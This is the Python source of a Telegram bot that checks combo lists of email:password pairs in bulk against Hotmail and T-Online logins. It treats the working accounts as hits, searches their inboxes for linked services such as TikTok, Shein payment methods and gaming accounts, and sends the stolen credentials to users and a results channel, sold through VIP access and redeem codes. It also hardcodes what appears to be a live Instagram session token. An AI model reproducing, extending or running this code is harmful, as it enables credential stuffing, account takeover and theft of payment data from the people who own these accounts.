                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b>",
                                message.chat.id,
                                progress_msg.message_id,
                                parse_mode='HTML'
                            )
                        except:
                            pass
        
            threading.Thread(target=progress_updater, daemon=True).start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                executor.map(check_one, combos)

            if hits:
                hits_data = "\n".join(hits).encode('utf-8')
                hits_filename = f"{len(hits)}x VALID HOTMAILS BY FORGECLOUD.txt"
                send_large_document(message.chat.id, hits_data, hits_filename,
                                    f"✅ <b>{len(hits)} Valid Hotmails</b>\n\n💎 {MY_SIGNATURE}")
            else:
                bot.send_message(message.chat.id, f"❌ <b>No Hits Found</b>\n\n📥 Checked: <b>{total}</b>", parse_mode='HTML')

            try:
                bot.delete_message(message.chat.id, progress_msg.message_id)
            except:
                pass

            user_sessions.pop(user_id, None)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return
    # ────────────────────────────────────────────────────────────

    can, remaining = can_scan(user_id)
    if not can:
        bot.send_message(message.chat.id,
                        f"⏳ <b>Rate Limit!</b>\n\n"
                        f"Next scan in: <b>{remaining}</b>",
                        parse_mode='HTML')
        return

    # Download file
    downloaded_file = _download_combo(message)
    if downloaded_file is None:
        return

    # Save file
    file_path = f"temp_{user_id}.txt"
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)

    # Update last scan time
    update_last_scan(user_id)

    # Get scan mode
    scan_mode = user_sessions.get(user_id, {}).get("mode", "all")
    custom_domain = user_sessions.get(user_id, {}).get("custom_domain", "")

    bot.send_message(message.chat.id,
                    "🚀 <b>Scan Started!</b>\n\n"
                    "Processing your combo file...",
                    parse_mode='HTML')

    # Start scanning
    is_grp = is_group_chat(message)
    threading.Thread(target=start_real_scan, 
                    args=(user_id, file_path, message.chat.id, scan_mode, custom_domain, is_grp)).start()

def start_real_scan(user_id, file_path, chat_id, scan_mode, custom_domain="", is_group_scan=False):
    """Real scanning process with STOP button"""

    if not start_scan(user_id):
        bot.send_message(chat_id, "⚠️ Du hast bereits einen aktiven Scan!", parse_mode='HTML')
        return

    # Read combos
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
    except:
        bot.send_message(chat_id, "❌ Error reading file!")
        stop_scan(user_id)
        return

    total = len(lines)
    hits = 0
    bad = 0
    retry_count = 0
    linked_total = 0
    all_hits = []

    # Determine services
    if scan_mode == "gaming":
        services_to_check = SERVICES_GAMING
    elif scan_mode == "social":
        services_to_check = SERVICES_SOCIAL
    elif scan_mode == "streaming":
        services_to_check = SERVICES_STREAMING
    elif scan_mode == "ai":
        services_to_check = SERVICES_AI
    elif scan_mode == "shopping":
        services_to_check = SERVICES_SHOPPING
    elif scan_mode == "tiktok":
        services_to_check = None  # Special handling for TikTok
    elif scan_mode == "single":
        # Single platform mode - get platform from session
        platform_name = user_sessions.get(user_id, {}).get("platform", "")
        if platform_name:
            # Find the platform's email in all services
            platform_email = None
            for service_name, email in SERVICES_ALL.items():
                if service_name == platform_name:
                    platform_email = email
                    break

            if platform_email:
                services_to_check = {platform_name: platform_email}
            else:
                services_to_check = SERVICES_ALL
        else:
            services_to_check = SERVICES_ALL
    else:
        services_to_check = SERVICES_ALL

    # Send progress with STOP button
    progress_msg = bot.send_message(chat_id,
                                   "⚡ <b>CHECKING IN PROGRESS</b>\n\n"
                                   "✅ Hits: 0\n"
                                   "❌ Bad: 0\n"
                                   "🔄 Retry: 0\n"
                                   "🔗 Linked: 0\n\n"
                                   "━━━━━━━━━━━━━━━━━━━━\n"
                                   f"📊 Progress: 0/{total} (0%)\n\n"
                                   "🔍 Current: Starting...",
                                   parse_mode='HTML',
                                   reply_markup=stop_scan_keyboard(user_id))

    # PIN the message
    try:
        bot.pin_chat_message(chat_id, progress_msg.message_id, disable_notification=True)
    except:
        pass

    start_time = time.time()

    # Shared state for parallel processing
    state = {
        'hits': 0, 'bad': 0, 'retry': 0, 'linked': 0,
        'processed': 0, 'all_hits': [], 'last_email': ''
    }
    state_lock = threading.Lock()
    stopped = [False]
    # Track which indices have been processed (thread-safe set for accurate resume)
    _processed_indices = set()
    _processed_lock = threading.Lock()

    # Backup file — every hit is written here IMMEDIATELY when detected,
    # before service checking, before message sending. Zero hit loss guarantee.
    _hits_backup_file = f"hits_backup_{user_id}_{int(start_time)}.txt"
    try:
        with open(_hits_backup_file, 'a', encoding='utf-8') as _hbf:
            _hbf.write(f"# Scan started {datetime.datetime.now()} | mode={scan_mode} | total={total}\n")
    except Exception:
        _hits_backup_file = f"hits_backup_{user_id}.txt"

    def _safe_send_hit(target_id, msg):
        """Send hit message with 3 retries — hit notification is never silently lost."""
        for _attempt in range(3):
            try:
                bot.send_message(target_id, msg, parse_mode='HTML')
                return True
            except Exception as _se:
                if _attempt < 2:
                    time.sleep(1)
        # All 3 attempts failed — write to backup file so admin can see it
        try:
            with open(_hits_backup_file, 'a', encoding='utf-8') as _f:
                _f.write(f"[MSG_FAIL] {msg[:200]}\n")
        except Exception:
            pass
        return False

    def _write_hit_to_backup(email, password, services=None):
        """Write hit to disk immediately — never lost even if process crashes."""
        try:
            svc_str = "|".join(services) if services else "no-services"
            with open(_hits_backup_file, 'a', encoding='utf-8') as _f:
                _f.write(f"{email}:{password} | {svc_str}\n")
        except Exception:
            pass

    def process_account(args):
        idx, line = args

        # NOTE: _processed_indices.add(idx) is in the finally block at the
        # bottom — it runs AFTER the check completes (or after any exception),
        # never before. This means the post-executor verify pass can safely
        # re-run any account that was silently dropped by an OS-level kill.

        if not active_scans.get(user_id, False):
            with state_lock:
                state['processed'] += 1
                state['bad'] += 1
            with _processed_lock:
                _processed_indices.add(idx)
            return

        if ':' not in line:
            with state_lock:
                state['processed'] += 1
                state['bad'] += 1
            with _processed_lock:
                _processed_indices.add(idx)
            return

        email = "(unknown)"
        password = ""
        _detected_hit = False  # tracks if we confirmed a HIT before any crash

        try:
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()

            with state_lock:
                state['last_email'] = email

            # ── Step 1: Check account with up to 3 retries on RETRY status ───
            result = None
            provider = "hotmail"
            for _attempt in range(3):
                try:
                    result, provider = check_account_auto(email, password)
                    if result["status"] != "RETRY":
                        break
                    if _attempt < 2:
                        time.sleep(0.3)
                except Exception as _ce:
                    if _attempt == 2:
                        raise
                    time.sleep(0.3)

            if result is None:
                result = {"status": "BAD"}

            if result["status"] == "HIT":
                _detected_hit = True

                # ── Step 2: Write hit to disk IMMEDIATELY — before anything
                #    else can fail. This guarantees zero hit loss on crash.  ──
                _write_hit_to_backup(email, password)

                if scan_mode == "tiktok" and provider == "hotmail":
                    # TikTok mode ──────────────────────────────────────────
                    tiktok_data = None
                    try:
                        tiktok_data = HotmailChecker.check_tiktok_full(
                            email, password, result["token"], result["cid"]
                        )
                    except Exception:
                        pass

                    svc_list = [f"TikTok (@{tiktok_data['username']})"] if tiktok_data else []
                    _write_hit_to_backup(email, password, svc_list)  # update with services

                    with state_lock:
                        state['hits'] += 1
                        state['processed'] += 1
                        hit_num = state['hits']
                        state['all_hits'].append({
                            "email": email, "password": password,
                            "services": svc_list
                        })

                    if tiktok_data:
                        verified_emoji = "✅" if tiktok_data.get('verified', False) else "❌"
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ TIKTOK HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

🎵 <b>TikTok Full Data:</b>
👤 Username: @{tiktok_data['username']}
👥 Followers: {format_number(tiktok_data.get('followers', 0))}
➕ Following: {format_number(tiktok_data.get('following', 0))}
📹 Videos: {tiktok_data.get('videos', 0)}
❤️ Likes: {format_number(tiktok_data.get('likes', 0))}
{verified_emoji} Verified: {tiktok_data.get('verified', False)}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    else:
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    _safe_send_hit(user_id if is_group_scan else chat_id, hit_msg)

                else:
                    # Standard service scan ────────────────────────────────
                    found_services = []
                    shein_payment_text = ""

                    # ── Step 3: Service check wrapped in try/except.
                    #    A failure here must NEVER drop the HIT. ──────────
                    try:
                        if provider == "tonline":
                            for svc_name, svc_email in services_to_check.items():
                                try:
                                    msg_ids = TOnlineChecker.search_inbox(email, password, svc_email)
                                    if msg_ids:
                                        found_services.append(svc_name)
                                except Exception:
                                    pass
                        else:
                            try:
                                found_services = HotmailChecker.check_services(
                                    email, password, result["token"], result["cid"], services_to_check
                                )
                            except Exception as _svc_err:
                                print(f"[HitSafe] check_services failed for {email}: {_svc_err} — hit still saved")
                                found_services = []
                    except Exception as _outer_svc_err:
                        print(f"[HitSafe] Outer service check failed for {email}: {_outer_svc_err}")
                        found_services = []

                    # ── Step 4: Shein payment (never drops the hit) ───────
                    if "Shein" in found_services:
                        try:
                            if provider == "hotmail":
                                shein_pay = HotmailChecker.check_shein_payment(
                                    email, password, result["token"], result["cid"]
                                )
                                shein_payment_text = f"\n\n🛍️ <b>Shein Payment:</b> {shein_pay['raw']}"
                            else:
                                fetched = TOnlineChecker.fetch_emails_from(email, password, "noreply@sheinnotice.com", max_count=5)
                                pay_methods = []
                                for item in fetched:
                                    combined = item.get("subject", "") + " " + item.get("body", "")
                                    pay_methods.extend(extract_payment_from_text(combined))
                                pay_methods = list(dict.fromkeys(pay_methods))
                                shein_payment_text = f"\n\n🛍️ <b>Shein Payment:</b> {' | '.join(pay_methods) if pay_methods else 'No Payment Method'}"
                        except Exception:
                            shein_payment_text = "\n\n🛍️ <b>Shein Payment:</b> N/A"

                    # ── Step 5: Update backup file with services now known ─
                    _write_hit_to_backup(email, password, found_services)

                    # ── Step 6: Commit to in-memory state ─────────────────
                    with state_lock:
                        state['hits'] += 1
                        state['processed'] += 1
                        state['linked'] += len(found_services)
                        hit_entry = {
                            "email": email, "password": password, "services": found_services
                        }
                        if shein_payment_text:
                            hit_entry["shein_payment"] = shein_payment_text
                        state['all_hits'].append(hit_entry)
                        hit_num = state['hits']

                    # ── Step 7: Build and send hit message with retry ──────
                    if found_services:
                        services_text = "\n".join([f"✅ {s}" for s in found_services])
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

🔗 Linked Services:
{services_text}{shein_payment_text}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    else:
                        hit_msg = f"""━━━━━━━━━━━━━━━━━━━━
⚡ HIT #{hit_num}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Password: {password}

⚠️ No linked services

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}"""
                    _safe_send_hit(user_id if is_group_scan else chat_id, hit_msg)

            elif result["status"] == "RETRY":
                with state_lock:
                    state['retry'] += 1
                    state['processed'] += 1
            else:
                with state_lock:
                    state['bad'] += 1
                    state['processed'] += 1

        except Exception as e:
            print(f"[ScanWorker] Error on {email}: {e}")
            # If we already confirmed a HIT before the crash, keep it as a hit
            if _detected_hit:
                print(f"[HitSafe] Crash after HIT detected for {email} — preserving as hit")
                _write_hit_to_backup(email, password, ["[crash-during-service-check]"])
                with state_lock:
                    state['hits'] += 1
                    state['processed'] += 1
                    state['all_hits'].append({
                        "email": email, "password": password, "services": []
                    })
                try:
                    _safe_send_hit(
                        user_id if is_group_scan else chat_id,
                        f"⚡ HIT (recovered)\n📧 {email}\n🔑 {password}\n⚠️ Service check crashed but hit is saved\n💎 {MY_SIGNATURE}"
                    )
                except Exception:
                    pass
            else:
                with state_lock:
                    state['bad'] += 1
                    state['processed'] += 1

        finally:
            # Always mark as processed — runs even after exception.
            # The post-executor verify pass uses this to find any truly
            # skipped accounts and re-run them.
            with _processed_lock:
                _processed_indices.add(idx)

    # Save initial scan state so we can resume if bot restarts
    save_scan_state(user_id, chat_id, lines, scan_mode, state, custom_domain, is_group_scan)
    _last_state_save = [time.time()]

    # Progress updater thread
    def progress_updater():
        while active_scans.get(user_id, False) and not stopped[0]:
            with state_lock:
                p = state['processed']
                h = state['hits']
                b = state['bad']
                r = state['retry']
                lnk = state['linked']
                last_em = state['last_email']

            if p >= total:
                break

            elapsed = time.time() - start_time
            cpm = int((p / elapsed * 60)) if elapsed > 0 else 0
            progress = (p / total * 100)

            try:
                bot.edit_message_text(
                    f"⚡ <b>CHECKING IN PROGRESS</b>\n\n"
                    f"✅ Hits: {h}\n"
                    f"❌ Bad: {b}\n"
                    f"🔄 Retry: {r}\n"
                    f"🔗 Linked: {lnk}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Progress: {p}/{total} ({progress:.1f}%)\n"
                    f"⚡ Speed: {cpm} CPM\n\n"
                    f"🔍 Last: {last_em}",
                    chat_id, progress_msg.message_id,
                    parse_mode='HTML',
                    reply_markup=stop_scan_keyboard(user_id)
                )
            except:
                pass

            # Save state every 30 seconds so we can resume after a restart
            if time.time() - _last_state_save[0] >= 30:
                try:
                    # Build accurate remaining list using processed indices set
                    with _processed_lock:
                        done = set(_processed_indices)
                    remaining = [lines[i] for i in range(len(lines)) if i not in done]
                    save_scan_state(user_id, chat_id, remaining, scan_mode, state, custom_domain, is_group_scan)
                    _last_state_save[0] = time.time()
                except Exception:
                    pass

            time.sleep(2)

    progress_thread = threading.Thread(target=progress_updater, daemon=True)
    progress_thread.start()

    # Run all accounts in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
        executor.map(process_account, enumerate(lines))

    # ── Zero-Skip Verification Pass ────────────────────────────────────────
    # After the main executor finishes, find every index that has no entry
    # in _processed_indices (i.e. the thread was silently killed before the
    # finally block ran) and re-submit those accounts.  Loop until every
    # single index is confirmed processed or the scan has been stopped.
    _verify_round = 0
    while active_scans.get(user_id, False):
        with _processed_lock:
            missed = [i for i in range(len(lines)) if i not in _processed_indices]
        if not missed:
            break
        _verify_round += 1
        print(f"[NeverSkip] Verify round {_verify_round}: re-running {len(missed)} unprocessed accounts")
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(40, len(missed))) as _vex:
            _vex.map(process_account, [(i, lines[i]) for i in missed])
    # ── End Zero-Skip Verification ──────────────────────────────────────────

    stopped[0] = True

    # Scan ended — clear persisted state so it doesn't resume again
    clear_scan_state(user_id)

    # Send the hits backup file to the user as a safety net
    # (contains every hit written to disk in real-time during the scan)
    try:
        if os.path.exists(_hits_backup_file):
            with open(_hits_backup_file, 'r', encoding='utf-8', errors='ignore') as _hbf:
                _backup_content = _hbf.read()
            # Only send if there are real hits (lines not starting with #)
            _real_hits = [l for l in _backup_content.splitlines() if l.strip() and not l.startswith('#') and not l.startswith('[MSG_FAIL]')]
            if _real_hits:
                _backup_send_content = f"# HITS BACKUP — ZERO LOSS GUARANTEED\n# Scan: {scan_mode} | {len(_real_hits)} hits captured\n\n" + '\n'.join(_real_hits)
                _backup_bytes = _backup_send_content.encode('utf-8')
                _target = user_id if is_group_scan else chat_id
                send_large_document(_target, _backup_bytes, f"hits_backup_{user_id}.txt",
                    f"🛡️ <b>Hits Backup File</b>\n✅ {len(_real_hits)} hits captured in real-time\n⚡ Zero-loss guaranteed\n💎 {MY_SIGNATURE}")
            os.remove(_hits_backup_file)
    except Exception as _bke:
        print(f"[HitsBackup] Could not send backup file: {_bke}")

    if not active_scans.get(user_id, False):
        bot.send_message(chat_id, "⏹ <b>Scan Stopped by User</b>", parse_mode='HTML')

    # Sync back to original variables for final summary
    hits = state['hits']
    bad = state['bad']
    retry_count = state['retry']
    linked_total = state['linked']
    all_hits = state['all_hits']

    # Unpin
    try:
        bot.unpin_chat_message(chat_id, progress_msg.message_id)
    except:
        pass

    # Create hits file(s) - separate file for each service
    if all_hits:
        # Group hits by service
        hits_by_service = {}
        for hit_data in all_hits:
            for service in hit_data.get('services', []):
                if service not in hits_by_service:
                    hits_by_service[service] = []
                hits_by_service[service].append(hit_data)

        # Create file for each service
        for service_name, service_hits in hits_by_service.items():
            # Clean service name for filename
            safe_service_name = service_name.replace(" ", "_").replace("+", "Plus")
            hits_file_path = f"hits_{safe_service_name}_by_{MY_SIGNATURE.replace('@', '')}.txt"

            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Created by {MY_SIGNATURE} {CHANNEL}\n")
                f.write(f"# Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Service: {service_name}\n")
                f.write(f"# Total Hits: {len(service_hits)}\n\n")

                for idx, hit_data in enumerate(service_hits, 1):
                    f.write(f"------hit found #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Password: {hit_data['password']}\n")
                    f.write(f"Service: {service_name}\n")
                    f.write(f"\n")

            try:
                send_to = user_id if is_group_scan else chat_id
                with open(hits_file_path, 'rb') as f:
                    file_data = f.read()
                svc_caption = (f"📁 {service_name} Hits\n\n"
                               f"Total: {len(service_hits)} hits\n"
                               f"💎 {MY_SIGNATURE}")
                send_large_document(send_to, file_data,
                                    os.path.basename(hits_file_path), svc_caption)
            except:
                pass

            # Clean up
            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)

        # If no services found but still has hits (empty services)
        hits_without_services = [h for h in all_hits if not h.get('services')]
        if hits_without_services:
            hits_file_path = f"hits_NoService_by_{MY_SIGNATURE.replace('@', '')}.txt"
            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Created by {MY_SIGNATURE} {CHANNEL}\n")
                f.write(f"# Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Hits without linked services\n")
                f.write(f"# Total: {len(hits_without_services)}\n\n")

                for idx, hit_data in enumerate(hits_without_services, 1):
                    f.write(f"------hit found #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Password: {hit_data['password']}\n")
                    f.write(f"\n")

            try:
                send_to = user_id if is_group_scan else chat_id
                with open(hits_file_path, 'rb') as f:
                    nosvc_data = f.read()
                nosvc_caption = (f"📁 Hits (No Services)\n\n"
                                 f"Total: {len(hits_without_services)} hits\n"
                                 f"💎 {MY_SIGNATURE}")
                send_large_document(send_to, nosvc_data,
                                    os.path.basename(hits_file_path), nosvc_caption)
            except:
                pass

            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)

    # Final summary with sorted export button
    sorted_markup = None
    if hits > 0 and all_hits:
        sorted_markup = types.InlineKeyboardMarkup()
        sorted_markup.add(types.InlineKeyboardButton("📂 Export Sorted by Service", callback_data=f"sorted_export_{user_id}"))
        user_sessions[user_id] = user_sessions.get(user_id, {})
        user_sessions[user_id]["last_hits_data"] = all_hits

    if is_group_scan:
        bot.send_message(chat_id,
                        f"✅ <b>SCAN COMPLETED!</b>\n\n"
                        f"📊 Results:\n"
                        f"• Hits: {hits}\n"
                        f"• Bad: {bad}\n"
                        f"• Retry: {retry_count}\n"
                        f"• Linked: {linked_total}\n"
                        f"• Total: {total}\n\n"
                        f"📩 <i>Hits sent to your DM!</i>\n\n"
                        f"💎 {MY_SIGNATURE}",
                        parse_mode='HTML')
        if hits > 0:
            bot.send_message(user_id,
                            f"✅ <b>SCAN COMPLETED!</b>\n\n"
                            f"📊 Results:\n"
                            f"• Hits: {hits}\n"
                            f"• Bad: {bad}\n"
                            f"• Retry: {retry_count}\n"
                            f"• Linked: {linked_total}\n"
                            f"• Total: {total}\n\n"
                            f"⬆️ Deine Hits findest du oben!\n\n"
                            f"💎 {MY_SIGNATURE}",
                            parse_mode='HTML',
                            reply_markup=sorted_markup)
    else:
        bot.send_message(chat_id,
                        f"✅ <b>SCAN COMPLETED!</b>\n\n"
                        f"📊 Results:\n"
                        f"• Hits: {hits}\n"
                        f"• Bad: {bad}\n"
                        f"• Retry: {retry_count}\n"
                        f"• Linked: {linked_total}\n"
                        f"• Total: {total}\n\n"
                        f"💎 {MY_SIGNATURE}",
                        parse_mode='HTML',
                        reply_markup=sorted_markup)

    try:
        _u = get_user(user_id)
        _uname = _u[1] if _u and len(_u) > 1 else ""
    except Exception:
        _uname = ""
    record_scan(user_id, username=_uname or "", scan_type=scan_mode,
               combos_count=total, hits=hits, bads=bad)
    update_stats(user_id, hits, bad, total, scan_mode)

    # Clean up
    if os.path.exists(file_path):
        os.remove(file_path)

    if user_id in user_sessions:
        if user_sessions[user_id].get("last_hits_data"):
            kept = {"last_hits_data": user_sessions[user_id]["last_hits_data"]}
            user_sessions[user_id] = kept
        else:
            del user_sessions[user_id]

    stop_scan(user_id)

# Run Bot
if __name__ == "__main__":
    print("="*50)
    print("🤖 PEACE CHECKER Bot - ULTIMATE")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"💎 Created by: {MY_SIGNATURE}")
    print(f"📢 Channel: {CHANNEL}")
    print("✅ All Features: ENABLED")
    print("="*50)

# ═══════════════════════════════════════════════════════════════════════════
# FEATURES - PEACE CHECKER by @WAKERC
# ═══════════════════════════════════════════════════════════════════════════

# Channel for results (No local file storage)
RESULTS_CHANNEL = "-1002465589285"

# JSON Database file
USERS_DB_JSON = "users_database.json"

# Redeem codes storage
REDEEM_CODES_FILE = "redeem_codes.json"

# JSON Database Functions
def load_json_users():
    """Load users from JSON"""
    if os.path.exists(USERS_DB_JSON):
        try:
            with open(USERS_DB_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {"users": []}
    return {"users": []}

def save_json_users(data):
    """Save users to JSON"""
    with open(USERS_DB_JSON, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_json_user(user_id):
    """Get user from JSON"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            return user
    return None

def add_json_user(user_id, username, first_name):
    """Add user to JSON"""
    data = load_json_users()

    if get_json_user(user_id):
        return

    new_user = {
        "id": user_id,
        "name": first_name or "User",
        "username": username or "unknown",
        "link_account": f"tg://user?id={user_id}",
        "account_number": str(user_id),
        "membership": "Free",
        "points": 0,
        "total_scans": 0,
        "total_hits": 0,
        "is_vip": False,
        "vip_until": None,
        "is_banned": False,
        "last_claim": None,
        "join_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    data['users'].append(new_user)
    save_json_users(data)

def update_json_user(user_id, **kwargs):
    """Update JSON user"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            for key, value in kwargs.items():
                user[key] = value
            save_json_users(data)
            return True
    return False

def get_json_stats():
    """Get statistics from JSON"""
    data = load_json_users()
    users = data.get('users', [])

    total = len(users)
    vips = sum(1 for u in users if u.get('is_vip'))
    banned = sum(1 for u in users if u.get('is_banned'))

    vip_1h = vip_1d = vip_1w = vip_1m = vip_forever = 0

    for u in users:
        if u.get('is_vip'):
            vip_until = u.get('vip_until')
            if vip_until == "Forever":
                vip_forever += 1
            elif vip_until:
                try:
                    vip_date = datetime.datetime.strptime(vip_until, "%Y-%m-%d %H:%M:%S")
                    now = datetime.datetime.now()
                    remaining = (vip_date - now).days

                    if remaining >= 25:
                        vip_1m += 1
                    elif remaining >= 6:
                        vip_1w += 1
                    elif remaining >= 1:
                        vip_1d += 1
                    else:
                        vip_1h += 1
                except:
                    pass

    return {
        "total": total,
        "vips": vips,
        "banned": banned,
        "vip_1h": vip_1h,
        "vip_1d": vip_1d,
        "vip_1w": vip_1w,
        "vip_1m": vip_1m,
        "vip_forever": vip_forever
    }

# Send to Channel
def send_to_channel(text, file_content=None, filename=None):
    """Send results to channel"""
    try:
        if file_content:
            send_large_document(RESULTS_CHANNEL, file_content.encode('utf-8'), filename or "results.txt", caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except:
        return False

# Redeem Key System
def load_redeem_codes():
    """Load redeem codes"""
    if os.path.exists(REDEEM_CODES_FILE):
        try:
            with open(REDEEM_CODES_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_redeem_codes(codes):
    """Save redeem codes"""
    with open(REDEEM_CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def generate_redeem_code(vip_duration="1d", points=0):
    """Generate redeem code"""
    code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
    codes = load_redeem_codes()
    codes[code] = {
        "vip_duration": vip_duration,
        "points": points,
        "used": False,
        "used_by": None,
        "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_redeem_codes(codes)
    return code

def use_redeem_code(code, user_id):
    """Use redeem code"""
    codes = load_redeem_codes()

    if code not in codes:
        return False, "Invalid code!"

    if codes[code]['used']:
        return False, "Code already used!"

    # Mark as used
    codes[code]['used'] = True
    codes[code]['used_by'] = user_id
    codes[code]['used_at'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_redeem_codes(codes)

    # Apply benefits
    vip_duration = codes[code]['vip_duration']
    points = codes[code]['points']

    user = get_json_user(user_id)
    if not user:
        return False, "User not found!"

    # Add VIP
    if vip_duration:
        add_vip(user_id, user['username'], vip_duration)

    # Add points
    if points > 0:
        current_points = user.get('points', 0)
        update_json_user(user_id, points=current_points + points)

    # Notify admin
    try:
        username_display = f"@{user['username']}" if user.get('username') and user['username'] != 'unknown' else f"ID: {user_id}"
        bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KEY EINGELÖST!</b>\n\n"
            f"👤 Nutzer: {username_display}\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"⏱ VIP Dauer: <b>{vip_duration}</b>\n"
            f"🔑 Key: <code>{code}</code>\n"
            f"📅 Zeit: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M')}",
            parse_mode='HTML'
        )
    except:
        pass

    return True, f"✅ Redeemed!\nVIP: {vip_duration}\nPoints: +{points}"

# Daily Claim
def can_claim_daily(user_id):
    """Check if can claim"""
    user = get_json_user(user_id)
    if not user:
        return False

    last_claim = user.get('last_claim')
    if not last_claim:
        return True

    try:
        last = datetime.datetime.strptime(last_claim, "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last).total_seconds()
        return diff >= 86400  # 24 hours
    except:
        return True

def claim_daily(user_id):
    """Claim daily reward"""
    if not can_claim_daily(user_id):
        return False, "Already claimed today!"

    # Give reward (10 points)
    user = get_json_user(user_id)
    current_points = user.get('points', 0)

    update_json_user(user_id, 
                    points=current_points + 10,
                    last_claim=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    return True, "✅ Claimed 10 points!"

# Leaderboard
def get_leaderboard():
    """Get top 10 users"""
    data = load_json_users()
    users = data.get('users', [])

    # Sort by hits
    sorted_users = sorted(users, key=lambda x: x.get('total_hits', 0), reverse=True)

    return sorted_users[:10]


# ═══════════════════════════════════════════════════════════════════════════
# NEW MESSAGE HANDLERS
# ═══════════════════════════════════════════════════════════════════════════


# Admin: Generate Redeem Code
@bot.message_handler(commands=['gencode'])
def generate_code_handler(message):
    """Generate redeem code (Admin only)"""
    if message.from_user.id != ADMIN_ID:
        return

    # Parse: /gencode 1d 50
    try:
        parts = message.text.split()
        vip_duration = parts[1] if len(parts) > 1 else "1d"
        points = int(parts[2]) if len(parts) > 2 else 0

        code = generate_redeem_code(vip_duration, points)

        bot.send_message(message.chat.id, 
            f"✅ Code Generated!\n\n"
            f"🔑 Code: <code>{code}</code>\n"
            f"👑 VIP: {vip_duration}\n"
            f"⭐ Points: {points}",
            parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, 
            "Usage: /gencode [duration] [points]\n\n"
            "Example: /gencode 1d 50")


# ═══════════════════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════════════════
# ADDITIONS - By @pyabrodie for Mahdi
# All original code above is preserved 100%
# ═══════════════════════════════════════════════════════════════════════════

# Additional imports
try:
    import pycountry
except:
    print("⚠️  Warning: pycountry not installed. Run: pip install pycountry")
    pycountry = None

# Bot Username
BOT_USERNAME = "@Full_InboxRobot"
RESULTS_CHANNEL = "-1002465589285"

# Instagram Token
INSTAGRAM_TOKEN = "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNzk1MzQ0MjI4MDAiLCJzZXNzaW9uaWQiOiI3OTUzNDQyMjgwMCUzQWdEWWEzMXdFa1pjbDFQJTNBMjUlM0FBWWdEWC1lVTJNMlAzYV8yX3E2RUZLS1VwOExUbVllZjNubVV4ODhYaEEifQ=="

# ═══════════════════════════════════════════════════════════════════════════
# INSTAGRAM FULL CAPTURE API
# ═══════════════════════════════════════════════════════════════════════════

def get_instagram_full_info(username):
    """Get Instagram full information using new API"""
    try:
        # Step 1: Get User ID
        r = requests.get(
            "https://i-fallback.instagram.com/api/v1/fbsearch/ig_typeahead/",
            params={"query": username},
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN
            }
        )

        data = r.json()
        if not data.get("list"):
            return None

        user_id = data["list"][0]["user"]["id"]

        # Step 2: Get Full Info
        response = requests.post(
            f"https://i.instagram.com/api/v1/users/{user_id}/info_stream/",
            data={
                "is_prefetch": "false",
                "entry_point": "profile",
                "from_module": "search_typeahead",
                "_uuid": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"
            },
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN,
                "X-IG-App-ID": "567067343352427"
            }
        )

        user = json.loads(response.text.strip().split('\n')[1]).get('user', {})

